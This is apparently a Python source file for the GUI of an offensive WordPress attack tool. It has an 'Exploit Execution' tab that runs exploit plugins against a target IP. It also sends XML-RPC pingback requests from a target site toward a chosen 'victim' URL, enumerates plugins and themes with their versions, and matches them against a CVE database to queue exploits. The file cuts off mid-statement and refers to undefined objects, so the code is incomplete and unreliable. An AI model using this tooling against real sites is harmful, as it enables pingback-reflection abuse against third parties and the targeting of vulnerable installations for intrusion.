import customtkinter as ctk
import threading
import json
import requests
import re
import os
import importlib.util
import xmlrpc.client
from tkinter import messagebox
from utils.logger import log  # Assuming a custom logger utility is used

# Store matched exploits globally
matched_exploits = []

# Class for Exploit Tab
class ExploitTab(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.target_var = ctk.StringVar()
        self.plugin_var = ctk.StringVar()
        self.status_var = ctk.StringVar(value="Idle")
        self.build_ui()

    def build_ui(self):
        """Builds the UI for the Exploit Tab."""
        ctk.CTkLabel(self, text="Exploit Execution", font=("Segoe UI", 18, "bold")).pack(pady=(10, 5))

        input_frame = ctk.CTkFrame(self)
        input_frame.pack(pady=10, padx=20, fill="x")

        # Target entry field
        self.target_entry = ctk.CTkEntry(input_frame, textvariable=self.target_var, placeholder_text="Target IP...")
        self.target_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))

        # Plugin ID entry field
        self.plugin_entry = ctk.CTkEntry(input_frame, textvariable=self.plugin_var, placeholder_text="Exploit Plugin ID...")
        self.plugin_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))

        # Run exploit button
        self.run_button = ctk.CTkButton(input_frame, text="Run Exploit", command=self.run_exploit_threaded)
        self.run_button.pack(side="left")

        # Status label
        self.status_label = ctk.CTkLabel(self, textvariable=self.status_var, text_color="gray", font=("Segoe UI", 12))
        self.status_label.pack(pady=(0, 10))

        # Output textbox to display results
        self.output_box = ctk.CTkTextbox(self, height=400, wrap="word")
        self.output_box.pack(padx=20, pady=10, fill="both", expand=True)
        self.output_box.insert("end", "Exploit results will appear here...\n")
        self.output_box.configure(state="disabled")

    def run_exploit_threaded(self):
        """Runs the exploit in a separate thread to avoid UI freeze."""
        target = self.target_var.get().strip()
        plugin = self.plugin_var.get().strip()

        if not target or not plugin:
            self.show_status("Fill in all fields.")
            return

        threading.Thread(target=self.run_exploit, args=(target, plugin), daemon=True).start()

    def run_exploit(self, target, plugin):
        """Runs the exploit on the given target."""
        self.show_status(f"Running exploit on {target}...")
        self.set_button_state(False)

        self.append_output(f"[INFO] Starting exploit with plugin {plugin}...\n")
        try:
            # Assuming 'run_exploit' is a function that runs the actual exploit logic
            results = run_exploit(target, plugin, gui_callback=self.append_output)
            self.append_output(f"[INFO] Exploit finished.\n")
        except Exception as e:
            self.append_output(f"[ERROR] {str(e)}\n")
            log.error(f"Error during exploit execution: {str(e)}")  # Log the error
        finally:
            self.set_button_state(True)
            self.show_status("Idle")

    def append_output(self, text):
        """Appends text to the output box."""
        self.output_box.configure(state="normal")
        self.output_box.insert("end", text)
        self.output_box.see("end")
        self.output_box.configure(state="disabled")

    def show_status(self, text):
        """Updates the status label."""
        self.status_var.set(text)

    def set_button_state(self, state: bool):
        """Enables/disables the run button based on state."""
        self.run_button.configure(state="normal" if state else "disabled")

# Function to run XML-RPC pingback exploit
def run_pingback_exploit():
    xmlrpc_url = exploit_target_entry.get().strip()
    victim_url = exploit_victim_entry.get().strip()

    if not xmlrpc_url or not victim_url:
        messagebox.showerror("Error", "Fill in both target and victim URLs.")
        return

    exploit_output.delete("0.0", "end")
    exploit_output.insert("end", f"[*] Sending pingback from {xmlrpc_url} to {victim_url}\n")

    try:
        proxy = xmlrpc.client.ServerProxy(xmlrpc_url)
        result = proxy.pingback.ping(victim_url, xmlrpc_url)
        exploit_output.insert("end", f"[+] Pingback response: {result}\n")
    except xmlrpc.client.Fault as fault:
        exploit_output.insert("end", f"[-] Fault: {fault.faultString}\n")
        log.error(f"XML-RPC fault: {fault.faultString}")
    except Exception as e:
        exploit_output.insert("end", f"[!] Error: {e}\n")
        log.error(f"Pingback exploit error: {e}")

# Function to scan for WordPress plugins and themes
def run_wp_asset_enum():
    url = exploit_target_entry.get().strip()
    if not url.startswith("http"):
        messagebox.showerror("Error", "Enter a valid WordPress URL.")
        return

    exploit_output.delete("0.0", "end")
    exploit_output.insert("end", f"[*] Scanning {url} for plugins and themes...\n")

    try:
        r = requests.get(url, timeout=10)
        html = r.text
        plugin_matches = re.findall(r'/wp-content/plugins/([a-zA-Z0-9-_]+)(/[^"\']*)?', html)
        theme_matches = re.findall(r'/wp-content/themes/([a-zA-Z0-9-_]+)(/[^"\']*)?', html)
        plugin_set = {m[0] for m in plugin_matches}
        theme_set = {m[0] for m in theme_matches}

        if plugin_set:
            exploit_output.insert("end", "\n[+] Plugins Found:\n")
            for plugin in plugin_set:
                version = re.search(rf'/wp-content/plugins/{plugin}.*?[?&]ver=([0-9\.]+)', html)
                if version:
                    exploit_output.insert("end", f" - {plugin} (ver {version.group(1)})\n")
                else:
                    exploit_output.insert("end", f" - {plugin}\n")
        else:
            exploit_output.insert("end", "[-] No plugins found.\n")

        if theme_set:
            exploit_output.insert("end", "\n[+] Themes Found:\n")
            for theme in theme_set:
                version = re.search(rf'/wp-content/themes/{theme}.*?[?&]ver=([0-9\.]+)', html)
                if version:
                    exploit_output.insert("end", f" - {theme} (ver {version.group(1)})\n")
                else:
                    exploit_output.insert("end", f" - {theme}\n")
        else:
            exploit_output.insert("end", "[-] No themes found.\n")

    except Exception as e:
        exploit_output.insert("end", f"[!] Failed to scan: {e}\n")
        log.error(f"WP asset enumeration failed: {e}")

# Function to match vulnerabilities
def match_vulnerabilities():
    global matched_exploits
    matched_exploits.clear()

    try:
        with open("cve_db.json", "r") as f:
            vuln_db = json.load(f)
    except Exception as e:
        exploit_output.insert("end", f"[!] Could not load CVE DB: {e}\n")
        log.error(f"Error loading CVE DB: {e}")
        return

    url = exploit_target_entry.get().strip()
    try:
        r = requests.get(url, timeout=10)
        html = r.text
    except Exception as e:
        exploit_output.insert("end", f"[!] Failed to fetch target HTML: {e}\n")
        log.error(f"Error fetching target HTML: {e}")
        return

    for plugin in vuln_db:
        if f"/wp-content/plugins/{plugin}" in html:
            version_match = re.search(rf'/wp-content/plugins/{plugin}.*?[?&]ver=([0-9\.]+)', html)
            if version_match:
                version = version_match.group(1)
                if version in vuln_db[plugin]:
                    vuln = vuln_db[plugin][version]
                    matched_exploits.append(vuln['exploit'])
                    exploit_output.insert("end", f"[+] {plugin} v{version} is VULNERABLE!\n")
                    exploit_output.insert("end", f"
